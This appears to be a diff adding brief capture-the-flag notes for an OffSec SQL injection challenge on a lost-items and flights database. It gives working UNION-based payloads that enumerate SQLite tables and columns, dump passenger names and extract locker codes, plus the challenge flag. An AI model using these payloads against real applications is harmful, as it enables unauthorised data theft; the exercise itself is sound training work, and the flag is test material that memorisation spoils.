@@ -1,0 +1,18 @@
+This query: 
+')) OR 1=1 -- - show all the items, claimed or not
+
+ query to find all the tables  ')) UNION SELECT 1,name,3,4,5,6,7,8 FROM sqlite_master WHERE type='table' -- - 
+Available tables are:
+contact_requests
+flights
+lost_items
+restricted_items
+sqlite_sequence 
+this query to see columns of a specific table  ')) UNION SELECT 1, name, 3, 4, 5, 6, 7, 8 FROM pragma_table_info(‘table_name’) -- -  or this to see the columns but in SQL format  ')) UNION SELECT 1, sql, 3, 4, 5, 6, 7, 8 FROM sqlite_master WHERE type='table' AND name='contact_requests' -- -
+
+')) UNION SELECT 1, passenger_name, state, 4, 5, 6, 7, 8 FROM lost_items li WHERE li.passenger_name = li.passenger_name -- -
+
+The following query resolve the challenge  ')) UNION SELECT 1,locker_code,3,4,5,6,7,8 FROM restricted_items  -- - 
+
+The flag is the following: offsec{un10n_p4r3n_br34k_BAdw9W7EAMKL5Jhw} 
+
